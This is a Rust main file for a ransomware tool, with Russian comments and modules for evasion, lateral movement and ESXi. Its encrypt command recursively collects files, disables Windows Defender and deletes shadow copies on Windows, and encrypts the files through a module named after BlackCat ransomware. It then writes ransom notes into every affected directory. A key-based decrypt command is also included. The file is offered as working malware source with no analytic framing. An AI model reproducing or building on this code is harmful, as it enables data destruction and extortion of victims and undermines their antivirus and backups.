mod crypto;
mod filesystem;
mod ransomware;
mod windows;
mod lateral_movement;
mod esxi;
mod evasion;
mod config;
mod linux;

use clap::{Parser, Subcommand};
use log::{info, warn, error};
use std::path::Path;
use std::collections::HashSet;

#[derive(Parser)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    Encrypt { #[arg(short, long)] path: String },
    Decrypt { #[arg(short, long)] path: String, #[arg(short, long)] key: String },
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::Builder::from_default_env()
        .filter_level(log::LevelFilter::Info).init();

    let cli = Cli::parse();

    match cli.command {
        Commands::Encrypt { path } => {
            // 1. Получаем список файлов (рекурсивно)
            let files = filesystem::scan_filesystem(&path)?;
            if files.is_empty() {
                error!("No files found");
                return Ok(());
            }

            // 2. Формируем список уникальных директорий
            let mut dirs_to_notify = HashSet::new();
            for file in &files {
                if let Some(parent) = Path::new(file).parent() {
                    if let Some(p_str) = parent.to_str() {
                        dirs_to_notify.insert(p_str.to_string());
                    }
                }
            }

            // Создаем строку со всеми папками для записки
            let all_dirs_list = dirs_to_notify.iter()
                .cloned()
                .collect::<Vec<String>>()
                .join("\n");

            // 3. Подготовка и Evasion
            #[cfg(target_os = "windows")]
            {
                let _ = windows::WindowsPlatform::disable_windows_defender();
                let _ = windows::WindowsPlatform::delete_shadow_copies();
            }

            // 4. Шифрование
            let crypto_engine = crypto::CryptoEngine::new()?;
            info!("Master Key: {}", hex::encode(crypto_engine.get_master_key()));

            ransomware::BlackCatRansomware::encrypt_all_files(
                files,
                ransomware::RansomwareConfig {
                    target_paths: vec![path.clone()],
                    file_extensions: vec!["txt".to_string()],
                    encryption_algorithm: "aes-256-gcm".to_string(),
                    max_parallelism: 4,
                },
                &crypto_engine,
            ).await?;

            // 5. Создаем записки везде, передавая общий список папок
            for dir in dirs_to_notify {
                #[cfg(target_os = "windows")]
                let _ = windows::WindowsPlatform::create_ransom_note(&dir, &all_dirs_list);
                #[cfg(target_os = "linux")]
                let _ = linux::LinuxOperations::create_ransom_note(&dir, &all_dirs_list);
            }
            info!("Done.");
        }

        Commands::Decrypt { path, key } => {
            info!("Decrypting: {}", path);
            let key_bytes = hex::decode(key)?;
            let mut master_key = [0u8; 32];
            master_key.copy_from_slice(&key_bytes);
            
            let crypto_engine = crypto::CryptoEngine::from_key(master_key);
            // scan_filesystem рекурсивно найдет все .sttp во вложенных папках
            let files = filesystem::scan_filesystem(&path)?;

            ransomware::BlackCatRansomware::decrypt_all_files(
                files,
                ransomware::RansomwareConfig {
                    target_paths: vec![path],
                    file_extensions: vec!["sttp".to_string()],
                    encryption_algorithm: "aes-256-gcm".to_string(),
                    max_parallelism: 4,
                },
                &crypto_engine,
            ).await?;
            info!("Restored.");
        }
    }
    Ok(())
}